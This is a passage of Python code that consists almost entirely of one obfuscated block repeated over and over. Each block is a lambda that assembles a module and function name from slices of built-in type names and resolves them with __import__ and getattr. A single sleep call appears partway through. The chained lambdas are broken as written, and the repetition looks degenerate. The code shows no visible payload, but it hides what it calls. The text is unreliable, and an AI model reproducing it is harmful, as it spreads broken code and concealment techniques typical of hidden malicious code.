                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            time.sleep(sleep_time)
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
